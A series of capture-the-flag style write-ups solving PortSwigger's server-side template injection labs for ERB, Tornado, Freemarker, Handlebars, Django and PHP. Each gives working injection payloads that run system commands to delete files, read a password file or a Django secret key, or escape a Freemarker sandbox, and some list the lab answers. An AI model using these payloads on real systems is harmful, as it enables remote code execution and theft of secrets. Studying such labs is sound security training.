## Basic SSTI
[Basic SSTI](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)

Write-up:

1. When we click the first product, we see the message "Unfortunately this product is out of stock."
If we change the message parameter to `<%= 7*7 %>`, we see that it returns 49: ERB injection possibility.

2. Changing the message parameter to `<%= system 'ls' %>` shows us the **morale.txt** file.
   
3. We can use `<%= system 'rm morale.txt' %>` to solve the lab.

## Basic SSTI (code context)
[Basic SSTI (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)

Write-up:

1. After logging in, we see there are two actions in our account: changing e-mail and preferred name.
Analyzing both these requests shows us that changing preferred name has an interesting parameter that changes our name display in post comments. For example, changing preferred name to name uses parameter `blog-post-author-display=user.name`.

2. After studying the Tornado docs, we see that its template expressions are surrounded by curly braces, so we can use these to escape and execute code: <br>
    `blog-post-author-display=user.name}}{{7*7}}` <br>
    This shows us 49, which points to code being executed.

3. Using {% %} to execute arbitrary code, we can craft the following payload: <br>
    `blog-post-author-display=user.name}}{%25%20import%20os%20%25}{{os.system('rm%20/home/carlos/morale.txt')}}` <br>
    URL-encoding the necessary characters (spaces: %20 and %: %25). This solves the lab.

## SSTI using documentation
[SSTI using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)

Write-up:

1. We are instructed to discover the template engine used. If we click one of the posts, we have
the option to edit a template, we can see that code is being executed to retrieve stock, for example.

2. Using this [tool](https://cheatsheet.hackmanit.de/template-injection-table/), 
we discover that this lab uses a Freemarker template.

3. Using the [documentation](https://freemarker.apache.org/docs/api/index.html), we craft the following payload: <br> `${"freemarker.template.utility.Execute"?new()("rm morale.txt")}` <br> This solves the lab.

## SSTI in an unknown language with a documented exploit
[SSTI in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)

Write-up:

1. Like in the **Basic SSTI** lab, we can change a message parameter. Using this
[tool](https://cheatsheet.hackmanit.de/template-injection-table/), we discover 
this lab is using a Handlebars template (Javascript).

2. Searching the internet for documented Handlebars SSTI exploits, we find this
[link](https://gist.github.com/vandaimer/b92cdda62cf731c0ca0b05a5acf719b2).

3. Using the Node.js [docs](https://nodejs.org/api/child_process.html) for child_process,
we can craft the following payload:
    ```handlebars
    {{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
        {{this.pop}}
        {{this.push (lookup string.sub "constructor")}}
        {{this.pop}}
        {{#with string.split as |codelist|}}
            {{this.pop}}
            {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');" }}
            {{this.pop}}
            {{#each conslist}}
            {{#with (string.sub.apply 0 codelist)}}
                {{this}}
            {{/with}}
            {{/each}}
        {{/with}}
        {{/with}}
    {{/with}}
    {{/with}}
    ```

4. URL-encoding this payload and submitting it as **message** solves the lab.

## SSTI with information disclosure via user-supplied objects
[SSTI with information disclosure via user-supplied objects](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)

Write-up:

1. After logging in, we are able to edit templates, and we discover that a Django 
template with Python 2.7 is being used.

2. Upon researching Django SSTI, we can find this [website](https://www.wallarm.com/what/server-side-template-injection-ssti-vulnerability).
It shows us that we can try to access {{settings}}, and possibly {{settings.SECRET_KEY}}, which are both possible.
This reveals the solution: **xd4klewsdwzux56wdrfdxgaajj8ekyr0**

## SSTI in a sandboxed environment
[SSTI in a sandboxed environment](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment)

Write-up:

1. We are told the website uses a Freemarker template and that we should break out
of the sandbox and read flag at home/carlos/my_password.txt. After logging in,
we see that we can once again edit the posts' templates.

2. Attempting to use the payload `${"freemarker.template.utility.Execute"?new()("cat /home/carlos/my_password.txt")}`
fails due to the sandboxed environment: <br>
"Instantiating freemarker.template.utility.Execute is not allowed in the template for security reasons."

1. After some research, we can find the following [documented exploit](https://www.synacktiv.com/en/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack). We use it
to craft the following payload: <br>
`${product.class.protectionDomain.classLoader.loadClass("freemarker.template.ObjectWrapper").getField("DEFAULT_WRAPPER").get(null).newInstance(product.class.protectionDomain.classLoader.loadClass("freemarker.template.utility.Execute"),null)("cat /home/carlos/my_password.txt")}` <br>
This gets us the solution: **6ahblydrrpsffr1ru83r**

## SSTI with a custom exploit
[SSTI with a custom exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit)

Write-up:

1. We need to discover which template engine the lab is using and then craft a 
payload to delete /home/carlos/.ssh/id_rsa. After logging in, we find a setup similar to
**Basic SSTI (code context)**. 

2. In our "My account" page, we have access to 2 different relevant POST requests: 
`POST /my-account/avatar` and `POST /my-account/change-blog-post-author-display`.
These are relevant because we can see the changes being applied when we open a post's comments.

3. When we upload an invalid image, we find out a user.SetAvatar() method exists, and that there
is a /home/carlos/User.php. <br>
`blog-post-author-display=user.setAvatar("/home/carlos/User.php","image/png")` <br>
This payload makes it so that the avatar is the relevant php file, and a GET request to it
allows us access to the file.

4. We see there is a method called gdprDelete which happens to delete the avatar file.
    ```php
    blog-post-author-display=user.setAvatar("/home/carlos/.ssh/id_rsa","image/png")
    blog-post-author-display=user.gdprDelete()
    ```

    These 2 payloads solve the lab.

